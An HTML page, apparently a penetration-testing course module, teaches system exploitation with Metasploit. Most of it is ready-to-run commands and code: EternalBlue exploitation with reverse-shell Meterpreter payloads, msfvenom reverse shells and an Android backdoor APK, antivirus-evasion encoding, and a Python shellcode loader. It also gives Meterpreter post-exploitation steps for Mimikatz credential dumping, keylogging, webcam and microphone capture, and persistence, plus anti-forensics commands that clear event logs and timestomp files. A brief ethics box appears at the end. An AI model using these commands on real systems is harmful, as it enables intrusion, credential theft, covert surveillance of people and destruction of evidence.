
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Exploitation and Metasploit</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            line-height: 1.6;
            color: #e2e8f0;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            margin: 0;
            padding: 0;
            min-height: 100vh;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 40px 20px;
        }
        .header {
            background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
            color: white;
            padding: 40px;
            border-radius: 15px;
            margin-bottom: 40px;
            text-align: center;
        }
        h1 {
            margin: 0;
            font-size: 2.5em;
            font-weight: 700;
        }
        .subtitle {
            margin-top: 10px;
            font-size: 1.1em;
            opacity: 0.9;
        }
        .content {
            background: rgba(30, 41, 59, 0.7);
            padding: 40px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(148, 163, 184, 0.1);
        }
        h2 {
            color: #dc2626;
            border-bottom: 2px solid #dc2626;
            padding-bottom: 10px;
            margin-top: 30px;
        }
        .highlight {
            background: linear-gradient(135deg, #065f46 0%, #047857 100%);
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            border-left: 4px solid #10b981;
        }
        .command-box {
            background: #0f172a;
            border: 1px solid #374151;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            color: #10b981;
            overflow-x: auto;
        }
        .warning {
            background: linear-gradient(135deg, #7c2d12 0%, #dc2626 100%);
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            border-left: 4px solid #ef4444;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }
        .card {
            background: rgba(15, 23, 42, 0.8);
            padding: 20px;
            border-radius: 10px;
            border: 1px solid rgba(148, 163, 184, 0.2);
        }
        .exploit-table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        .exploit-table th,
        .exploit-table td {
            border: 1px solid #374151;
            padding: 10px;
            text-align: left;
        }
        .exploit-table th {
            background: #1e293b;
            color: #dc2626;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>System Exploitation and Metasploit</h1>
            <p class="subtitle">Learn system exploitation techniques using Metasploit framework and manual methods</p>
        </div>

        <div class="content">
            <h2>Introduction</h2>
            <p>
                System exploitation represents the core offensive capability in penetration testing, where 
                theoretical vulnerabilities are converted into practical system access. This module provides 
                comprehensive coverage of exploitation techniques using the Metasploit framework alongside 
                manual exploitation methods, payload development, and post-exploitation fundamentals.
            </p>

            <h2>Learning Objectives</h2>
            <ul>
                <li>Master Metasploit framework architecture and components</li>
                <li>Understand exploit development and modification</li>
                <li>Learn payload selection and customization techniques</li>
                <li>Practice manual exploitation methodologies</li>
                <li>Develop buffer overflow exploitation skills</li>
                <li>Understand evasion and anti-forensics techniques</li>
                <li>Master post-exploitation enumeration and persistence</li>
            </ul>

            <h2>Metasploit Framework Architecture</h2>

            <h3>Core Components</h3>
            <div class="grid">
                <div class="card">
                    <h4>üèóÔ∏è Framework Structure</h4>
                    <ul>
                        <li><strong>MSFconsole:</strong> Primary interface</li>
                        <li><strong>Exploits:</strong> Vulnerability attack code</li>
                        <li><strong>Payloads:</strong> Post-exploitation code</li>
                        <li><strong>Auxiliary:</strong> Supporting modules</li>
                        <li><strong>Encoders:</strong> Evasion techniques</li>
                        <li><strong>NOPs:</strong> No operation instructions</li>
                    </ul>
                </div>
                <div class="card">
                    <h4>üéØ Payload Types</h4>
                    <ul>
                        <li><strong>Singles:</strong> Self-contained payloads</li>
                        <li><strong>Stagers:</strong> Small loader payloads</li>
                        <li><strong>Stages:</strong> Larger functional payloads</li>
                        <li><strong>Meterpreter:</strong> Advanced staged payload</li>
                        <li><strong>Shell:</strong> Command line access</li>
                        <li><strong>VNC:</strong> Remote desktop access</li>
                    </ul>
                </div>
                <div class="card">
                    <h4>üîß Auxiliary Modules</h4>
                    <ul>
                        <li><strong>Scanners:</strong> Network/service discovery</li>
                        <li><strong>Fuzzers:</strong> Input validation testing</li>
                        <li><strong>Denial of Service:</strong> Availability testing</li>
                        <li><strong>Gather:</strong> Information collection</li>
                        <li><strong>Admin:</strong> Administrative functions</li>
                        <li><strong>Server:</strong> Service simulation</li>
                    </ul>
                </div>
                <div class="card">
                    <h4>üìä Database Integration</h4>
                    <ul>
                        <li><strong>PostgreSQL:</strong> Backend database</li>
                        <li><strong>Workspaces:</strong> Project organization</li>
                        <li><strong>Host tracking:</strong> Target management</li>
                        <li><strong>Service enumeration:</strong> Port/service data</li>
                        <li><strong>Vulnerability tracking:</strong> Finding management</li>
                        <li><strong>Loot storage:</strong> Extracted data</li>
                    </ul>
                </div>
            </div>

            <h3>Metasploit Basic Operations</h3>
            <div class="command-box">
# Metasploit initialization
msfdb init
msfconsole

# Database operations
db_status
workspace -a project_name
workspace -l
hosts
services
vulns

# Module searching and selection
search type:exploit platform:windows
search cve:2017-0144
use exploit/windows/smb/ms17_010_eternalblue
info
options
show options

# Target and payload configuration
set RHOSTS 192.168.1.100
set LHOST 192.168.1.10
set LPORT 4444
show targets
set TARGET 0
show payloads
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Exploit execution
check
exploit
run -j  # run as background job
jobs -l
sessions -l
sessions -i 1

# Module development helpers
reload_all
edit
makerc /path/to/resource.rc
</div>

            <h2>Common Exploitation Scenarios</h2>

            <h3>Network Service Exploits</h3>
            <table class="exploit-table">
                <thead>
                    <tr>
                        <th>Service</th>
                        <th>Common Vulnerabilities</th>
                        <th>Metasploit Modules</th>
                        <th>Impact</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>SMB (445)</td>
                        <td>EternalBlue, SmbGhost</td>
                        <td>ms17_010_eternalblue, cve_2020_0796</td>
                        <td>Remote Code Execution</td>
                    </tr>
                    <tr>
                        <td>RDP (3389)</td>
                        <td>BlueKeep, CVE-2019-0708</td>
                        <td>cve_2019_0708_bluekeep_rce</td>
                        <td>System Access</td>
                    </tr>
                    <tr>
                        <td>SSH (22)</td>
                        <td>Weak credentials, key reuse</td>
                        <td>ssh_login, ssh_login_pubkey</td>
                        <td>Command Execution</td>
                    </tr>
                    <tr>
                        <td>Web Services</td>
                        <td>Apache Struts, PHP vulnerabilities</td>
                        <td>struts2_content_type_ognl</td>
                        <td>Web Shell Access</td>
                    </tr>
                    <tr>
                        <td>Database (1433/3306/5432)</td>
                        <td>Weak authentication, injection</td>
                        <td>mssql_login, mysql_login</td>
                        <td>Data Access</td>
                    </tr>
                </tbody>
            </table>

            <h3>EternalBlue Exploitation Example</h3>
            <div class="command-box">
# EternalBlue (MS17-010) exploitation workflow

# 1. Target discovery and verification
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# 2. Exploit configuration
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444

# 3. Verify target compatibility
check

# 4. Execute exploit
exploit

# 5. Post-exploitation (if successful)
sysinfo
getuid
ps
migrate [PID]

# Alternative payloads for different scenarios
set PAYLOAD windows/x64/shell/reverse_tcp  # Simple shell
set PAYLOAD windows/x64/vncinject/reverse_tcp  # VNC access
set PAYLOAD windows/x64/exec  # Single command execution
</div>

            <h2>Manual Exploitation Techniques</h2>

            <h3>Buffer Overflow Exploitation</h3>
            <div class="grid">
                <div class="card">
                    <h4>üîç Vulnerability Analysis</h4>
                    <ul>
                        <li>Source code review</li>
                        <li>Fuzzing input validation</li>
                        <li>Crash analysis</li>
                        <li>Register control verification</li>
                        <li>Stack layout understanding</li>
                    </ul>
                </div>
                <div class="card">
                    <h4>üéØ Exploit Development</h4>
                    <ul>
                        <li>Offset calculation</li>
                        <li>Return address overwrite</li>
                        <li>Shellcode development</li>
                        <li>Bad character identification</li>
                        <li>Space constraint analysis</li>
                    </ul>
                </div>
                <div class="card">
                    <h4>üõ°Ô∏è Protection Bypass</h4>
                    <ul>
                        <li>DEP/NX bypass techniques</li>
                        <li>ASLR defeat methods</li>
                        <li>Stack canary circumvention</li>
                        <li>ROP chain construction</li>
                        <li>Heap spray techniques</li>
                    </ul>
                </div>
                <div class="card">
                    <h4>üß™ Testing and Refinement</h4>
                    <ul>
                        <li>Controlled environment testing</li>
                        <li>Reliability improvement</li>
                        <li>Payload optimization</li>
                        <li>Stability enhancements</li>
                        <li>Portability considerations</li>
                    </ul>
                </div>
            </div>

            <h3>Buffer Overflow Development Process</h3>
            <div class="command-box">
# Buffer overflow exploitation workflow

# 1. Crash verification
python -c "print 'A' * 1000" | nc target.com 9999

# 2. Offset discovery
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
# Send pattern and analyze crash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q [EIP_VALUE]

# 3. EIP control verification
python -c "print 'A' * [OFFSET] + 'BBBB' + 'C' * 100" | nc target.com 9999

# 4. Bad character identification
badchars = "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
# Remove characters that truncate payload

# 5. JMP ESP location
!mona jmp -r esp -cpb "\x00\x0a\x0d"
# Or use objdump/msfelfscan for Linux

# 6. Shellcode generation
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -b "\x00\x0a\x0d" -f c

# 7. Final exploit construction
exploit = "A" * offset + jmp_esp_address + "\x90" * 16 + shellcode

# 8. Testing and delivery
# Test in controlled environment first
# Verify payload execution
# Check for stability issues
</div>

            <h2>Payload Development and Customization</h2>

            <h3>MSFvenom Payload Generation</h3>
            <div class="command-box">
# MSFvenom usage examples

# List available payloads
msfvenom -l payloads

# Windows reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe

# Linux reverse shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > shell

# Web payloads
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f war > shell.war

# Android APK backdoor
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o backdoor.apk

# Encoded payloads (AV evasion)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe

# Custom format outputs
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c  # C array
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f python  # Python
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw  # Raw bytes

# Bad character avoidance
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -b "\x00\x0a\x0d" -f exe

# Multiple iterations and encoders
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/alpha_mixed -i 10 -f exe
</div>

            <h3>Custom Shellcode Development</h3>
            <div class="command-box">
# Custom shellcode development techniques

# Assembly to shellcode conversion
nasm -f elf32 shellcode.asm -o shellcode.o
objcopy -O binary shellcode.o shellcode.bin
xxd -i shellcode.bin

# Shellcode testing framework
#!/usr/bin/python
import ctypes

# Shellcode bytes
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Create executable memory
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),
    ctypes.c_int(0x40)
)

# Copy shellcode
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_int(ptr),
    shellcode,
    ctypes.c_int(len(shellcode))
)

# Execute
thread = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_int(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)

ctypes.windll.kernel32.WaitForSingleObject(thread, -1)

# Null-free shellcode techniques
# Use register manipulation instead of null bytes
# Implement dynamic API resolution
# Utilize position-independent code
</div>

            <h2>Meterpreter Advanced Usage</h2>

            <h3>Meterpreter Commands and Techniques</h3>
            <div class="command-box">
# Meterpreter core commands

# System information
sysinfo
getuid
getpid
ps
pgrep explorer

# File system operations
pwd
ls
cd C:\\
download C:\\file.txt
upload /local/file.txt C:\\
search -f *.txt -d C:\\

# Process manipulation
migrate 1234
execute -f cmd.exe -a "/c calc.exe"
kill 1234

# Network operations
portfwd add -l 3389 -p 3389 -r 127.0.0.1
route add 10.0.0.0 255.255.255.0 1

# Registry operations
reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion -v ProgramFilesDir
reg setval -k HKLM\\Software\\Test -v Data -t REG_SZ -d "Hello"

# Privilege operations
getsystem
getprivs
steal_token 1234

# Persistence mechanisms
run persistence -X -i 10 -p 4444 -r 192.168.1.10

# Extensions loading
load kiwi  # Mimikatz functionality
load incognito  # Token manipulation
load priv  # Privilege escalation
load stdapi  # Standard API

# Kiwi (Mimikatz) commands
creds_all
golden_ticket_create
lsa_dump_sam
wifi_list
</div>

            <h3>Advanced Meterpreter Techniques</h3>
            <div class="command-box">
# Advanced Meterpreter operations

# Memory manipulation
ps
inject 1234 /path/to/dll.dll

# Screenshot and keylogging
screenshot
keyscan_start
keyscan_dump
keyscan_stop

# Webcam operations
webcam_list
webcam_snap

# Audio recording
record_mic -d 10

# Timestomping
timestomp C:\\file.txt -v
timestomp C:\\file.txt -c "01/01/2020 12:00:00"

# Event log manipulation
clearev

# Packet capture
use sniffer
sniffer_interfaces
sniffer_start 1
sniffer_dump /tmp/capture.pcap

# Pivoting setup
background
route add 10.1.1.0 255.255.255.0 1
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.1.1.0/24
set THREADS 50
run

# Session passing
sessions -l
sessions -u 1  # Upgrade shell to meterpreter
sessions -i 1
background
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
</div>

            <h2>Evasion and Anti-Forensics</h2>

            <h3>Antivirus Evasion Techniques</h3>
            <div class="grid">
                <div class="card">
                    <h4>üîí Encoding and Encryption</h4>
                    <ul>
                        <li>Multiple encoding iterations</li>
                        <li>Custom encryption algorithms</li>
                        <li>Polymorphic code generation</li>
                        <li>Runtime decryption</li>
                        <li>XOR obfuscation</li>
                    </ul>
                </div>
                <div class="card">
                    <h4>üì¶ Packing and Compression</h4>
                    <ul>
                        <li>UPX packing</li>
                        <li>Custom packers</li>
                        <li>Compression algorithms</li>
                        <li>Entry point modification</li>
                        <li>Section manipulation</li>
                    </ul>
                </div>
                <div class="card">
                    <h4>üïê Time-based Evasion</h4>
                    <ul>
                        <li>Sleep timers</li>
                        <li>Environment checks</li>
                        <li>Sandbox detection</li>
                        <li>User interaction requirements</li>
                        <li>Delayed execution</li>
                    </ul>
                </div>
                <div class="card">
                    <h4>üîÄ Process Injection</h4>
                    <ul>
                        <li>DLL injection</li>
                        <li>Process hollowing</li>
                        <li>Reflective DLL loading</li>
                        <li>Manual DLL loading</li>
                        <li>Atom bombing</li>
                    </ul>
                </div>
            </div>

            <h3>Anti-Forensics Techniques</h3>
            <div class="command-box">
# Anti-forensics implementation

# File system artifacts
# Secure deletion
shred -vfz -n 3 /path/to/file
sdelete -p 3 -s -z C:\

# Timestomp manipulation
timestomp file.txt -c "01/01/2010 12:00:00"  # Change creation time
timestomp file.txt -m "01/01/2010 12:00:00"  # Change modification time
timestomp file.txt -a "01/01/2010 12:00:00"  # Change access time

# Registry cleaning
reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /f

# Event log clearing
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Network artifacts
# Clear ARP cache
arp -d *

# Clear DNS cache
ipconfig /flushdns

# Process hiding techniques
# Inject into legitimate processes
migrate_to_explorer()
migrate_to_svchost()

# Memory-only execution
# Load payloads directly in memory
# Avoid disk-based artifacts
# Use fileless techniques

# Log tampering
# Modify log timestamps
# Delete specific log entries
# Disable logging services temporarily
</div>

            <div class="warning">
                <strong>Legal and Ethical Considerations:</strong>
                <ul>
                    <li>Only perform exploitation within authorized scope</li>
                    <li>Obtain explicit written permission before testing</li>
                    <li>Use exploitation techniques responsibly</li>
                    <li>Avoid causing system damage or data loss</li>
                    <li>Implement proper session management</li>
                    <li>Document all exploitation attempts</li>
                    <li>Follow responsible disclosure practices</li>
                </ul>
            </div>

            <div class="highlight">
                <strong>Key Takeaway:</strong> System exploitation is a critical skill that requires deep understanding 
                of system architecture, vulnerability mechanics, and payload development. Effective exploitation 
                combines automated tools like Metasploit with manual techniques and custom development to achieve 
                reliable system access while maintaining stealth and avoiding detection.
            </div>

            <h2>Next Steps</h2>
            <p>In the next module, we'll explore post-exploitation and privilege escalation techniques, learning how to maintain access, escalate privileges, and perform comprehensive system enumeration.</p>
        </div>
    </div>
</body>
</html>
